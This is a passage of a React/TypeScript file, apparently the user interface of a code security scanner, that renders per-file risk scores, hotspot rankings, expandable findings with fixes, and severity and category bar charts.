    <div className="max-h-96 overflow-y-auto custom-scrollbar p-2">
      {tree.children?.map((node) => (
        <TreeNodeView
          key={node.path}
          node={node}
          depth={0}
          hotspotPaths={hotspotPaths}
          highlightPath={highlightPath}
          onHighlight={onHighlight}
        />
      ))}
    </div>
  );
}

function TreeNodeView({
  node,
  depth,
  hotspotPaths,
  highlightPath,
  onHighlight,
}: {
  node: TreeNode;
  depth: number;
  hotspotPaths: Set<string>;
  highlightPath: string | null;
  onHighlight: (path: string | null) => void;
}) {
  const [open, setOpen] = useState(!node.isFile);

  if (node.isFile && node.fileResult) {
    const fr = node.fileResult;
    const r = fr.result;
    const isHotspot = hotspotPaths.has(node.path);
    const isHighlighted = highlightPath === node.path;
    const indent = depth * 12 + 8;

    return (
      <Collapsible open={open} onOpenChange={setOpen}>
        <div
          className={`rounded ${
            isHighlighted ? "ring-2 ring-emerald-500/50 bg-emerald-500/5" : ""
          } ${isHotspot ? "border-l-2 border-l-red-500/70" : ""}`}
        >
          <CollapsibleTrigger asChild>
            <button
              className="flex w-full items-center gap-1.5 rounded px-2 py-1 text-left text-xs hover:bg-accent/40 transition-colors"
              style={{ paddingLeft: `${indent}px` }}
              onClick={() => onHighlight(isHighlighted ? null : node.path)}
            >
              {open ? (
                <ChevronDown className="h-3 w-3 shrink-0 text-muted-foreground" />
              ) : (
                <ChevronRight className="h-3 w-3 shrink-0 text-muted-foreground" />
              )}
              {verdictIcon(r.verdict, "h-3.5 w-3.5 shrink-0")}
              <FileCode2 className="h-3.5 w-3.5 shrink-0 text-muted-foreground" />
              <span className="min-w-0 flex-1 truncate font-mono">
                {node.name}
              </span>
              {isHotspot && (
                <Flame
                  className="h-3 w-3 shrink-0 text-red-500"
                  aria-label="hotspot"
                />
              )}
              <span
                className={`font-mono text-[10px] font-bold ${riskText(
                  r.riskScore,
                )}`}
              >
                {r.riskScore}
              </span>
              {r.stats.totalFindings > 0 && (
                <Badge variant="outline" className="h-4 px-1 text-[9px]">
                  {r.stats.totalFindings}
                </Badge>
              )}
            </button>
          </CollapsibleTrigger>
          <CollapsibleContent>
            <div
              className="space-y-1 border-l border-border py-1 pl-2"
              style={{ marginLeft: `${indent + 6}px` }}
            >
              {fr.error ? (
                <p className="text-[10px] text-red-500">Error: {fr.error}</p>
              ) : r.findings.length === 0 ? (
                <p className="text-[10px] text-emerald-600 dark:text-emerald-400">
                  No findings · {r.stats.totalLines} lines · hash{" "}
                  <span className="font-mono">
                    {r.sourceHash.slice(0, 8)}
                  </span>
                </p>
              ) : (
                <>
                  {r.findings.slice(0, 5).map((f, i) => (
                    <FindingInline key={i} finding={f} />
                  ))}
                  {r.findings.length > 5 && (
                    <p className="text-[10px] italic text-muted-foreground">
                      + {r.findings.length - 5} more finding
                      {r.findings.length - 5 !== 1 ? "s" : ""}
                    </p>
                  )}
                </>
              )}
            </div>
          </CollapsibleContent>
        </div>
      </Collapsible>
    );
  }

  // Directory node
  return (
    <Collapsible open={open} onOpenChange={setOpen}>
      <CollapsibleTrigger asChild>
        <button
          className="flex w-full items-center gap-1.5 rounded px-2 py-1 text-left text-xs font-medium hover:bg-accent/40 transition-colors"
          style={{ paddingLeft: `${depth * 12 + 8}px` }}
        >
          {open ? (
            <ChevronDown className="h-3 w-3 shrink-0 text-muted-foreground" />
          ) : (
            <ChevronRight className="h-3 w-3 shrink-0 text-muted-foreground" />
          )}
          <Files className="h-3.5 w-3.5 shrink-0 text-emerald-500/70" />
          <span className="min-w-0 flex-1 truncate font-mono">{node.name}/</span>
        </button>
      </CollapsibleTrigger>
      <CollapsibleContent>
        {node.children?.map((child) => (
          <TreeNodeView
            key={child.path}
            node={child}
            depth={depth + 1}
            hotspotPaths={hotspotPaths}
            highlightPath={highlightPath}
            onHighlight={onHighlight}
          />
        ))}
      </CollapsibleContent>
    </Collapsible>
  );
}

function FindingInline({ finding }: { finding: Finding }) {
  const sev = SEVERITY_BADGE[finding.severity];
  return (
    <div className="flex items-center gap-1.5 rounded bg-muted/30 px-2 py-1 text-[10px]">
      <span className={`inline-block h-1.5 w-1.5 shrink-0 rounded-full ${sev.dot}`} />
      <span className="shrink-0 font-mono text-[9px] text-muted-foreground">
        {finding.ruleId}
      </span>
      <span className="min-w-0 flex-1 truncate text-foreground/80">
        {finding.title}
      </span>
      <span className="shrink-0 font-mono text-[9px] text-muted-foreground">
        L{finding.line}
      </span>
    </div>
  );
}

// ----- Hotspot ranking -----
function HotspotRankingView({
  result,
  onClick,
}: {
  result: ProjectScanResult;
  onClick: (path: string) => void;
}) {
  const hotspots = result.aggregate.hotspotFiles;
  if (hotspots.length === 0) {
    return (
      <div className="p-4 text-center text-[11px] text-muted-foreground">
        No hotspot files — all files clean.
      </div>
    );
  }
  return (
    <div className="max-h-96 space-y-1 overflow-y-auto custom-scrollbar p-2">
      {hotspots.map((h, i) => (
        <button
          key={`${h.path}-${i}`}
          onClick={() => onClick(h.path)}
          className="flex w-full items-center gap-2 rounded border border-border bg-card px-2 py-1.5 text-left text-xs transition-colors hover:bg-accent/40 hover:border-emerald-500/40"
        >
          <span className="w-6 shrink-0 font-mono text-[10px] font-bold text-muted-foreground">
            #{i + 1}
          </span>
          <span className="min-w-0 flex-1 truncate font-mono" title={h.path}>
            {h.path}
          </span>
          <div className="flex shrink-0 items-center gap-1.5">
            <div className="h-1.5 w-16 overflow-hidden rounded-full bg-muted">
              <div
                className={`h-full rounded-full transition-all ${riskBarColor(
                  h.riskScore,
                )}`}
                style={{ width: `${Math.max(2, h.riskScore)}%` }}
              />
            </div>
            <span
              className={`w-6 text-right font-mono text-[10px] font-bold ${riskText(
                h.riskScore,
              )}`}
            >
              {h.riskScore}
            </span>
            {h.findingCount > 0 && (
              <Badge variant="outline" className="h-4 px-1 text-[9px]">
                {h.findingCount}
              </Badge>
            )}
          </div>
        </button>
      ))}
    </div>
  );
}

// ----- Top findings -----
function TopFindingsView({ result }: { result: ProjectScanResult }) {
  const [expanded, setExpanded] = useState<number | null>(null);
  const top = result.aggregate.topFindings;
  if (top.length === 0) {
    return (
      <div className="p-4 text-center text-[11px] text-muted-foreground">
        No findings across the project.
      </div>
    );
  }
  return (
    <div className="max-h-96 space-y-1 overflow-y-auto custom-scrollbar p-2">
      {top.map((tf, i) => {
        const sev = SEVERITY_BADGE[tf.finding.severity];
        const isOpen = expanded === i;
        return (
          <div
            key={`${tf.path}-${tf.finding.ruleId}-${tf.finding.line}-${i}`}
            className={`overflow-hidden rounded border border-border bg-card ${sev.leftBorder}`}
          >
            <button
              onClick={() => setExpanded(isOpen ? null : i)}
              className="flex w-full items-center gap-2 px-2 py-1.5 text-left text-xs transition-colors hover:bg-accent/30"
            >
              <span
                className={`inline-block h-1.5 w-1.5 shrink-0 rounded-full ${sev.dot}`}
              />
              <span
                className={`shrink-0 rounded px-1.5 py-0.5 font-mono text-[9px] uppercase ${sev.badge}`}
              >
                {tf.finding.severity}
              </span>
              <span className="shrink-0 font-mono text-[10px] text-muted-foreground">
                {tf.finding.ruleId}
              </span>
              <span className="min-w-0 flex-1 truncate text-foreground/80">
                {tf.finding.title}
              </span>
              <span className="shrink-0 font-mono text-[10px] text-muted-foreground">
                {tf.path}:{tf.finding.line}
              </span>
            </button>
            <AnimatePresence initial={false}>
              {isOpen && (
                <motion.div
                  initial={{ height: 0, opacity: 0 }}
                  animate={{ height: "auto", opacity: 1 }}
                  exit={{ height: 0, opacity: 0 }}
                  transition={{ duration: 0.18 }}
                  className="overflow-hidden border-t border-border/60"
                >
                  <div className="space-y-1.5 px-2 py-1.5 text-[10px]">
                    <p className="text-foreground/80">{tf.finding.description}</p>
                    {tf.finding.snippet && (
                      <pre className="overflow-x-auto rounded bg-muted/60 px-2 py-1 font-mono text-[10px] text-foreground/90">
                        <code>{tf.finding.snippet}</code>
                      </pre>
                    )}
                    {tf.finding.remediation && (
                      <p className="text-emerald-600 dark:text-emerald-400">
                        <span className="font-semibold">Fix:</span>{" "}
                        {tf.finding.remediation}
                      </p>
                    )}
                  </div>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        );
      })}
    </div>
  );
}

// ----- Severity + Category breakdown bars -----
function BreakdownCard({
  title,
  icon,
  subtitle,
  children,
}: {
  title: string;
  icon: React.ReactNode;
  subtitle?: string;
  children: React.ReactNode;
}) {
  return (
    <div className="rounded-md border border-border bg-card p-3">
      <div className="mb-2 flex items-baseline justify-between">
        <h4 className="flex items-center gap-1.5 text-xs font-semibold">
          {icon}
          {title}
        </h4>
        {subtitle && (
          <span className="text-[10px] text-muted-foreground">{subtitle}</span>
        )}
      </div>
      {children}
    </div>
  );
}

function SeverityBars({ result }: { result: ProjectScanResult }) {
  const sev = result.aggregate.bySeverity;
  const total =
    Object.values(sev).reduce((a, b) => a + (b ?? 0), 0) || 1;
  return (
    <div className="space-y-1.5">
      {(["critical", "high", "medium", "low", "info"] as Severity[]).map(
        (s) => {
          const n = sev[s] ?? 0;
          const pct = (n / total) * 100;
          const meta = SEVERITY_BADGE[s];
          return (
            <div key={s} className="flex items-center gap-2">
              <span className="w-16 text-[11px] capitalize text-foreground/80">
                {s}
              </span>
              <div className="h-2 flex-1 overflow-hidden rounded-full bg-muted">
                <div
                  className={`h-full rounded-full transition-all ${meta.bar}`}
                  style={{ width: `${Math.max(n > 0 ? 2 : 0, pct)}%` }}
                />
              </div>
              <span className="w-8 text-right font-mono text-[11px] tabular-nums">
                {n}
              </span>
            </div>
          );
        },
      )}
    </div>
  );
}

function CategoryBars({ result }: { result: ProjectScanResult }) {
  const cat = result.aggregate.byCategory;
  const entries = Object.entries(cat)
    .filter(([, n]) => (n ?? 0) > 0)
    .sort((a, b) => (b[1] ?? 0) - (a[1] ?? 0));
  const total = entries.reduce((a, [, n]) => a + (n ?? 0), 0) || 1;

  if (entries.length === 0) {
    return (
      <p className="py-3 text-center text-[10px] italic text-muted-foreground">
        No categories triggered — all files clean.
      </p>
    );
  }

  return (
    <div className="space-y-1.5">
      {entries.slice(0, 10).map(([catKey, n]) => {
        const pct = ((n ?? 0) / total) * 100;
        const label = categoryLabel(catKey as Category);
        return (
          <div key={catKey} className="flex items-center gap-2">
            <span
              className="w-32 shrink-0 truncate text-[11px] text-foreground/80"
              title={label}
            >
              {label}
            </span>
            <div className="h-2 flex-1 overflow-hidden rounded-full bg-muted">
              <div
                className="h-full rounded-full bg-gradient-to-r from-emerald-500 to-emerald-400 transition-all"
                style={{ width: `${Math.max(2, pct)}%` }}
              />
            </div>
            <span className="w-8 text-right font-mono text-[11px] tabular-nums">
              {n}
            </span>
          </div>
        );
      })}
      {entries.length > 10 && (
        <p className="pt-1 text-[10px] italic text-muted-foreground">
          + {entries.length - 10} more categories
        </p>
      )}
    </div>
  );
}
